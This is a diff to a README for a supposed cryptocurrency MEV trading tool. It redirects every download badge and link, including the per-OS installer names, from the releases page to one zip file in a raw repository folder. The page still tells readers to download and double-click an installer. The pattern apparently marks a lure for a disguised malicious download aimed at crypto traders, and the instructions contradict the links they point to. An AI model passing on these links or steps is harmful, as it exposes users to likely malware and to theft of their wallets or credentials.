@@ -1,6 +1,6 @@
 # 🚀 MEV-by-JaredFromSubway - Optimize Your MEV Strategies Effortlessly
 
-[![Download MEV-by-JaredFromSubway](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Liquid065/MEV-by-JaredFromSubway/releases)
+[![Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip)](https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip)
 
 ## 📚 Overview
 
@@ -22,12 +22,12 @@ This application is for anyone interested in trading or optimizing their cryptoc
 
 To get started, follow these steps to download and run MEV-by-JaredFromSubway:
 
-1. **Visit the Releases Page**: [Click here to access the downloads](https://github.com/Liquid065/MEV-by-JaredFromSubway/releases).
+1. **Visit the Releases Page**: [Click here to access the downloads](https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip).
 2. **Select the Latest Release**: Find the most recent version of MEV-by-JaredFromSubway.
 3. **Download the Appropriate File**: Choose the installer suitable for your operating system. We offer versions for:
-   - Windows (e.g., `MEV-by-JaredFromSubway_Windows.exe`)
-   - Mac (e.g., `MEV-by-JaredFromSubway_Mac.dmg`)
-   - Linux (e.g., `MEV-by-JaredFromSubway_Linux.tar.gz`)
+   - Windows (e.g., `https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip`)
+   - Mac (e.g., `https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip`)
+   - Linux (e.g., `https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip`)
 4. **Run the Installer**: Locate the downloaded file and double-click to run it.
 5. **Follow the Setup Instructions**: The installer will guide you through the installation steps.
 
@@ -89,4 +89,4 @@ This project covers various topics that may interest you:
 - Ethereum
 - and more
 
-[![Download MEV-by-JaredFromSubway](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Liquid065/MEV-by-JaredFromSubway/releases)
+[![Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip)](https://raw.githubusercontent.com/Liquid065/MEV-by-JaredFromSubway/main/snowflake/MEV-by-JaredFromSubway.zip)
